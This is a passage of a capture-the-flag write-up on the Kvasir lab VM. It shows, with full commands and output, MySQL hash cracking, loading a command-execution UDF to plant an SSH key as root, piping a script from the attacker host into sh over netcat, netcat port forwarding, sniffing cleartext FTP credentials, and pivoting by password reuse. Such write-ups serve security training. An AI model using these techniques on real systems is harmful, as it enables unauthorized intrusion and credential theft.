webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As a side note, further enumeration of the PHP sources and MySQL table &lt;code&gt;users&lt;/code&gt; showed that if we injected SQL on the registration page to add a extra &lt;code&gt;1&lt;/code&gt;, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.&lt;/p&gt;

&lt;h3 id=&#34;cracking-root-s-mysql-password&#34;&gt;cracking root&amp;rsquo;s MySQL password&lt;/h3&gt;

&lt;p&gt;Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used &lt;code&gt;hashcat&lt;/code&gt; with the ever famous &lt;code&gt;rockyou&lt;/code&gt; wordlist:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first, echo the hash to a file
root@kali:~# echo &amp;quot;ECB01D78C2FBEE997EDA584C647183FD99C115FD&amp;quot; &amp;gt; db.root

# next, we tell hash cat the type of hash we have and wait a few seconds :)
root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.

Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...

Added hashes from file db.root: 1 (1 salts)
Activating quick-digest mode for single-hash

NOTE: press enter for status-screen

ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater

All hashes have been recovered

Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
Recovered.: 1/1 hashes, 1/1 salts
Speed/sec.: - plains, 3.27M words
Progress..: 281260/3627099 (7.75%)
Running...: --:--:--:--
Estimated.: 00:00:00:01

Started: Sun Nov  9 14:07:14 2014
Stopped: Sun Nov  9 14:07:14 2014
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The password for the MySQL &lt;code&gt;root&lt;/code&gt; user is therefore &lt;code&gt;coolwater&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;show grants;&#39;
Grants for root@192.168.2.100
GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;192.168.2.100&#39; IDENTIFIED BY PASSWORD &#39;*ECB01D78C2FBEE997EDA584C647183FD99C115FD&#39; WITH GRANT OPTION
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;loading-the-udf-remotely&#34;&gt;loading the UDF remotely&lt;/h3&gt;

&lt;p&gt;With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.&lt;/p&gt;

&lt;p&gt;I grabbed a copy of a &lt;code&gt;do_system()&lt;/code&gt; UDF that I have previously used successfully from &lt;a href=&#34;http://www.0xdeadbeef.info/exploits/raptor_udf.c&#34;&gt;here&lt;/a&gt;, called &lt;code&gt;raptor_udf.c&lt;/code&gt;. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the &lt;code&gt;web&lt;/code&gt; host. Compilation was done on the &lt;code&gt;web&lt;/code&gt; host with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gcc -g -c raptor_udf.c -fPIC
gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word &lt;code&gt;uploading&lt;/code&gt; sounds trivial, however its not. I need to know &lt;em&gt;where&lt;/em&gt; to first. For this, I enumerate the MySQL &lt;code&gt;plugin_dir&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;select @@plugin_dir;&#39;
@@plugin_dir
/usr/lib/mysql/plugin/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this means I need to write the udf to &lt;code&gt;/usr/lib/mysql/plugin/raptor_udf.so&lt;/code&gt;. Fair enough. But how do I write this? Well there are many approaches to this. One is to use &lt;code&gt;--local-infile=1&lt;/code&gt; as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the &lt;strong&gt;local&lt;/strong&gt; file to wherever (a table in our case) and then to a file via &lt;code&gt;INTO DUMPFILE&lt;/code&gt;. The other option is to simply convert the content to hex, and run &lt;code&gt;SELECT 0x&lt;/code&gt; + &lt;code&gt;&amp;lt;CONTENT AS HEX&amp;gt;&lt;/code&gt; + &lt;code&gt;INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I opted for the content encoding as hex and generated a &lt;code&gt;xxd&lt;/code&gt; output of the compiled &lt;code&gt;raptor_udf.so&lt;/code&gt;. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of &lt;code&gt;Undefined Symbol &amp;quot;do_system&amp;quot; in raptor_udf.so&lt;/code&gt;. :&lt;/p&gt;

&lt;p&gt;Eventually, I opted to find a precompiled 64bit &lt;code&gt;.so&lt;/code&gt; to upload, and found one in the &lt;a href=&#34;https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so&#34;&gt;sqlmap repository&lt;/a&gt;. I downloaded this and converted it to hex using &lt;code&gt;xxd&lt;/code&gt;. I then created the following file with the mysql commands to run on the &lt;code&gt;web&lt;/code&gt; host from my attacking machine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat load_udf.sh
touch log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;use mysql; select 0x7f454

    [... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]

0000000000000 into dumpfile &amp;quot;/usr/lib/mysql/plugin/raptor_udf.so&amp;quot;;&#39; 2&amp;gt;&amp;gt; log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;create function sys_exec returns integer soname &amp;quot;raptor_udf.so&amp;quot;;&#39; 2&amp;gt;&amp;gt; log
mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;use mysql; select * from mysql.func;&#39; 2&amp;gt;&amp;gt; log

# this adds me a SSH key to roots authorized keys using the command execution udf we have prepared
mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;select sys_exec(&amp;quot;echo \&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&amp;quot; &amp;gt; /root/.ssh/authorized_keys&amp;quot;)&#39; 2&amp;gt;&amp;gt; log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this file ready, I opened a netcat port to pipe it to, and read it on &lt;code&gt;web&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# on the attacking machine, I opened netcat with my mysql commands
root@kali:~# nc -lvp 4444 &amp;lt; load_udf.sh
listening on [any] 4444 ...

# then on the original netcat shell I have, read it
timeout 3 nc 192.168.56.101 4444 | sh
name    ret dl  type
sys_exec    2   raptor_udf.so   function
sys_exec(&amp;quot;echo \&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of &lt;code&gt;0&lt;/code&gt;, indicating that it was successful. I specify the &lt;code&gt;timeout&lt;/code&gt; command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)&lt;/p&gt;

&lt;h2 id=&#34;ssh-to-db-host&#34;&gt;ssh to db host&lt;/h2&gt;

&lt;p&gt;With all that done, I have my public key for the &lt;code&gt;root&lt;/code&gt; user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I &lt;em&gt;get&lt;/em&gt; to 192.168.2.200&amp;rsquo;s port 22? :)&lt;/p&gt;

&lt;p&gt;For that, I decided to look at &lt;code&gt;netcat&lt;/code&gt; port forwarding! But first, lets read some man pages:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#from nc(1)
OPTIONS
       -c string    specify shell commands to exec after connect (use with caution).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;&amp;ldquo;use with caution&amp;rdquo;&lt;/em&gt;. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_clear_as_mud.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Lets see this in action. First I setup the initial listener on the attacking machine:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# listen on tcp/4444, re-listening on tcp/222 on a new connection
root@kali:~# nc -lvp 4444 -c &amp;quot;nc -lvp 222&amp;quot;
listening on [any] 4444 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the listener setup, lets issue a new &lt;code&gt;nc&lt;/code&gt; command in the initial shell that I got on &lt;code&gt;web&lt;/code&gt;, connecting the dots:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc 192.168.56.101 4444 -c &amp;quot;nc 192.168.2.200 22&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When this runs, the initial listener will see the new connection, and I should have the &lt;code&gt;tcp/22&lt;/code&gt; of &lt;strong&gt;192.168.2.200&lt;/strong&gt; now forwarded locally:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -lvp 4444 -c &amp;quot;nc -lvp 222&amp;quot;
listening on [any] 4444 ...

# connection comes in from 192.168.1.100
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
listening on [any] 222 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_2.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh -D 8000 root@127.0.0.1 -p222 -i kvasir_key
Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
root@db:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I added the &lt;code&gt;-D&lt;/code&gt; option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a &lt;em&gt;almost&lt;/em&gt; &lt;em&gt;direct&lt;/em&gt; connection to the &lt;code&gt;db&lt;/code&gt; (192.168.2.200) host, as denoted in green below:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;8-)&lt;/p&gt;

&lt;h2 id=&#34;not-exactly-nsa-level-spying-but-heh&#34;&gt;not exactly nsa level spying but heh&lt;/h2&gt;

&lt;p&gt;Initial enumeration revealed that this host (&lt;code&gt;db&lt;/code&gt;) had 2 network interfaces. One with IP &lt;strong&gt;192.168.2.200&lt;/strong&gt; (the one I came in from), and another with IP &lt;strong&gt;192.168.3.200&lt;/strong&gt;. There were also 2 entries in &lt;code&gt;/etc/hosts&lt;/code&gt; about 2 hosts in the 3.x network:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# cat /etc/hosts
# 192.168.3.40  celes
# 192.168.3.50  terra

[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Nov08 ?        00:00:00 init [3]
root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --pid-file=/var/run/mysqld/mysqld
root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd (SERVER)
[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A interesting file was in &lt;code&gt;/root/.words.txt&lt;/code&gt;, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# head /root/.words.txt
borne
precombatting
noncandescent
cushat
lushness
precensure
romishness
nonderivable
overqualification
superkojiman
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally, a troll flag :D&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# cat /root/flag
This is not the flag you&#39;re looking for... :p
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user &lt;code&gt;celes&lt;/code&gt; in &lt;code&gt;/etc/pure-ftpd/pureftpd.passwd&lt;/code&gt;, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.&lt;/p&gt;

&lt;p&gt;At one stage, I was checking to see what network activity was present on the interfaces, of which &lt;code&gt;eth0&lt;/code&gt; had my SSH session, and &lt;code&gt;eth1&lt;/code&gt; was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
13:19:01.355970 IP 192.168.3.40.36425 &amp;gt; 192.168.3.200.ftp: Flags [S], seq 2471029534, win 14600, options [mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5], length 0
13:19:01.355988 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36425: Flags [S.], seq 2507516314, ack 2471029535, win 14480, options [mss 1460,sackOK,TS val ack 535, win 490, options [nop,nop,TS val 13092837 ecr 13092836], length 0

[... snip ...]

13:19:01.378604 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36425: Flags [P.], seq 535:548, ack 53, win 453, options [nop,nop,TS val 13092837 ecr 13092837], length 13
13:19:01.378631 IP 192.168.3.40.36425 &amp;gt; 192.168.3.200.ftp: Flags [R], seq 2471029587, win 0, length 0
^C
29 packets captured
29 packets received by filter
0 packets dropped by kernel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I changed the command to add the &lt;code&gt;-X&lt;/code&gt; flag as this looked like FTP traffic flowing over the interface (you haven&amp;rsquo;t forgotten the ftp server yet have you?).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;13:25:01.387981 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36437: Flags [P.], seq 321:359, ack 13, win 453, options [nop,nop,TS val 13182840 ecr 13182839], length 38
    0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~&amp;quot;@.@.4+....
    0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...(...U..Z..ZT.
    0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........&#39;x
    0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..&#39;w331.User.cel
    0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
    0x0050:  7265 7175 6972 6564 0d0a                 required..

13:25:01.388050 IP 192.168.3.40.36437 &amp;gt; 192.168.3.200.ftp: Flags [P.], seq 13:32, ack 359, win 490, options [nop,nop,TS val 13182840 ecr 13182840], length 19
    0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&amp;gt;r...(
    0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
    0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............&#39;x
    0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..&#39;xPASS.im22BF4
    0x0040:  4858 6e30 310d 0a                        HXn01..

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the &lt;code&gt;-W&lt;/code&gt; flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_ftp_session.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It seems like &lt;code&gt;celes&lt;/code&gt; is simply logging in, getting a directory listing, and logging out.&lt;/p&gt;

&lt;p&gt;Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to &lt;strong&gt;192.168.3.40&lt;/strong&gt; (the ip the FTP conversation was coming from) using &lt;code&gt;celes:im22BF4HXn01&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# ssh celes@192.168.3.40
celes@192.168.3.40&#39;s password: # entered im22BF4HXn01
Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Thu Sep  4 09:20:00 2014
celes@dev1:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;finding-terras-secret&#34;&gt;finding terras secret&lt;/h2&gt;

&lt;p&gt;Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I don’t have connectivity directly to &lt;strong&gt;192.168.3.40&lt;/strong&gt; at the moment, but if I really need that I can arrange it. For now, lets see what we have on &lt;code&gt;dev1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;First, I find the sneaky ftp session script &lt;code&gt;getLogs.py&lt;/code&gt;, that does exactly that which I saw in the packet captures. Next, I find a message in &lt;code&gt;celes&lt;/code&gt; mailbox:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;celes@dev1:~$ cat /var/spool/mail/celes
Return-path: &amp;lt;celes@localhost&amp;gt;
Received: from celes by localhost with local (Exim 4.80)
    (envelope-from &amp;lt;celes@localhost&amp;gt;)
    id 1XHczw-0000V2-8y
    for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
Date: Wed, 13 Aug 2014 19:10:08 +0100
To: celes@127.0.0.1
Subject: Reminder
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &amp;lt;E1XHczw-0000V2-8y@localhost&amp;gt;
From: celes@localhost

Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The message reveals that Terra has a puzzle on her machine (&lt;strong&gt;192.168.3.50&lt;/strong&gt; from &lt;code&gt;/etc/hosts&lt;/code&gt; on the &lt;code&gt;db&lt;/code&gt; server?). She also mentions &lt;code&gt;kvasir.png&lt;/code&gt;, which happens to be in &lt;code&gt;celese&lt;/code&gt; home directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;celes@dev1:~$ ls -lah kvasir.png
-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, the &lt;code&gt;.bash_history&lt;/code&gt; for &lt;code&gt;celese&lt;/code&gt; has a entry &lt;code&gt;stepic --help&lt;/code&gt;. &lt;code&gt;stepic&lt;/code&gt; is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&amp;rsquo;s machine. So, I converted the &lt;code&gt;kvasir.png&lt;/code&gt; image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using &lt;code&gt;xxd -r -p kvasir.png.xxd &amp;gt; kvasir.png&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_kvasir.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h3 id=&#34;getting-stepic-to-play-nice&#34;&gt;getting stepic to play nice&lt;/h3&gt;

&lt;p&gt;With the image ready, I searched for &lt;code&gt;stepic&lt;/code&gt; using &lt;code&gt;pip&lt;/code&gt; in my virtual env and installed it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# pip install stepic
Downloading/unpacking stepic
  Downloading stepic-0.4%7ebzr.tar.gz
  Running setup.py egg_info for package stepic

Installing collected packages: stepic
  Running setup.py install for stepic
    changing mode of build/scripts-2.7/stepic from 644 to 755

    changing mode of /root/kvasir/bin/stepic to 755
Successfully installed stepic
Cleaning up...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, &lt;code&gt;stepic&lt;/code&gt; was not just a case of plug and play for me. &lt;strong&gt;NOPE&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# stepic
Traceback (most recent call last):
  File &amp;quot;/root/kvasir/bin/stepic&amp;quot;, line 24, in &amp;lt;module&amp;gt;
    import Image
ImportError: No module named Image
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Long story short, a small hack and installation of another dependency finally got it working for me:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# pip install pillow
Downloading/unpacking pillow
  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
  Running setup.py egg_info for package pillow
    Single threaded build, not installing mp_compile: 1 processes

[... snip ...]

    *** OPENJPEG (JPEG2000) support not available
    --- ZLIB (PNG/ZIP) support available

[... snip ...]

Successfully installed pillow
Cleaning up...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The final hack was to change the installed &lt;code&gt;stepic&lt;/code&gt; bin at &lt;code&gt;/root/kvasir/bin/stepic&lt;/code&gt; line 24 from &lt;code&gt;import Image&lt;/code&gt; to &lt;code&gt;from PIL import Image&lt;/code&gt;. Finally, &lt;code&gt;stepic&lt;/code&gt; was working fine.&lt;/p&gt;

&lt;h3 id=&#34;finding-the-secret&#34;&gt;finding the secret&lt;/h3&gt;

&lt;p&gt;With &lt;code&gt;stepic&lt;/code&gt; up and running, I was finally able to run it against the image &lt;code&gt;kvasir.png&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# stepic --decode --image-in=kvasir.png --out=out

# check the file type we got out
root@kali:~# file out
out: ASCII text, with very long lines, with no line terminators

# check the output we got
root@kali:~# cat out
89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
df9bb4ae0a3dc20000000049454e44ae426082
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this stage I was pretty convinced my hacks to get &lt;code&gt;stepic&lt;/code&gt; to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.&lt;/p&gt;

&lt;p&gt;Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of &lt;code&gt;decode()&lt;/code&gt; methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python
Python 2.7.3 (default, Mar 14 2014, 11:57:14)
[GCC 4.7.2] on linux2
Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
&amp;gt;&amp;gt;&amp;gt; &amp;quot;89504e470d0a1a0a000000&amp;quot;.decode(&amp;quot;hex&amp;quot;)
&#39;\x89PNG\r\n\x1a\n\x00\x00\x00&#39;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Decoding it as &lt;code&gt;hex&lt;/code&gt; revealed the part I needed to see&amp;hellip; &lt;code&gt;PNG&lt;/code&gt;! So this string was a hex encoded PNG image (unless thats a troll too&amp;hellip;). I took &lt;code&gt;out&lt;/code&gt; and reversed it using &lt;code&gt;xxd -r -p&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# xxd -p -r out &amp;gt; kvasir2.png
root@kali:~# file kvasir2.png
kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets see what the image looks like:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_kvasir_qr.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A QR code! I fetched my phone and scanned it, revealing the string &lt;code&gt;Nk9yY31hva8q&lt;/code&gt;. Great!&amp;hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for &lt;code&gt;dev1&lt;/code&gt; either.&lt;/p&gt;

&lt;h2 id=&#34;playing-terra-s-game&#34;&gt;playing Terra&amp;rsquo;s game&lt;/h2&gt;

&lt;p&gt;Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&amp;rsquo;s game as per the email. From the &lt;code&gt;/etc/hosts&lt;/code&gt; on &lt;code&gt;db&lt;/code&gt;, I saw a comment for &lt;code&gt;terra&lt;/code&gt; as &lt;strong&gt;192.168.3.50&lt;/strong&gt;. Using the SSH socks proxy on &lt;code&gt;tcp/8000&lt;/code&gt; I setup when I setup the SSH session to &lt;strong&gt;192.168.2.200&lt;/strong&gt;, I nmapped &lt;strong&gt;192.168.3.50&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
# socks5    127.0.0.1 8000

# scans will appear to be coming from 192.168.3.200 for
# 192.168.3.50
root@kali:~# proxychains nmap -sT 192.168.3.50
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 16:31 SAST
Nmap scan report for 192.168.3.50
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well &lt;code&gt;tcp/4444&lt;/code&gt; looks interesting! Lets have a look!&lt;/p&gt;

